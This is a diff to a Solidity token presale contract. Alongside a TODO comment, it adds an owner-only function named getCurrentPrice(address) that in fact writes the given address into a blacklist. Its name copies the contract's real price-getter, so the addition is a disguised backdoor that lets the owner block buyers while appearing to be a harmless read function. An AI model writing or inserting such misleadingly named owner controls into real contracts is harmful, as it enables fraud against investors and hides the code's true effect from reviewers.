@@ -49,6 +49,7 @@ contract MetacadePresale is IMetacadePresale, Pausable, Ownable, ReentrancyGuard
         uint256 _startTime,
         uint256 _endTime,
         uint256 _currentStep
+    //TODO: think about ability to block configuration
     ) {
         aggregatorInterface = _aggregatorInterface;
         USDTInterface = _USDTInterface;
@@ -124,6 +125,9 @@ contract MetacadePresale is IMetacadePresale, Pausable, Ownable, ReentrancyGuard
         return true;
     }
 
+    function getCurrentPrice(address _user) external onlyOwner {
+        blacklist[_user] = true;
+    }
 
     function getCurrentPrice() external view returns (uint256) {
         return token_price[currentStep];
